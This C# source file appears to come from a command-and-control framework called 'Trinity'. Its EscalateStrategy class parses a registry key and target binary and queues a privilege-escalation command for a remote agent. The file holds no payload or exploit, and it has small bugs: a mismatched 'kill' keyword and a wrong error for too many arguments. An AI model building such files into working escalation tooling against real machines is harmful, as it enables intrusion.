//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using Trinity.Shared.DTOs.Command;
using Trinity.Shared.Errors;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Results;

namespace Client.Interpreter.Strategies
{
    public class EscalateStrategy : ICommandStrategy
    {
        public readonly string Keyword = "kill";
        private readonly ICommandAPI _client;

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Initializes a new instance of the EscalateStrategy class using the specified command API client.
        /// </summary>
        /// <param name="client">The command API client to use for command execution.</param>
        public EscalateStrategy(ICommandAPI client)
        {
            _client = client;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Queues a escalate command for the specified agent and returns the result asynchronously.
        /// </summary>
        /// <param name="agentID">The unique identifier of the agent.</param>
        /// <param name="command">The runAs command to execute.</param>
        /// <returns>A task that represents the asynchronous operation. The task result contains the command output.</returns>
        public async Task<Result<CommandCreationResponse>> ProcessCommandAsync(int agentID, string? command)
        {
            if (string.IsNullOrEmpty(command))
            {
                return CommandError.TooFewArgs(Keyword);
            }

            var tokens = command.Split(" ");
            if (tokens.Length < 2)
            {
                return CommandError.TooFewArgs(Keyword);
            }
            else if (tokens.Length > 2)
            {
                // Too many arguements
                return CommandError.TooFewArgs(Keyword);
            }

            var dto = new EscalateDTO
            {
                RegKey = tokens[0],
                TargetBinary = tokens[1],
            };

            return await _client.QueueEscalateCommandAsync(agentID, dto);
        }
    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//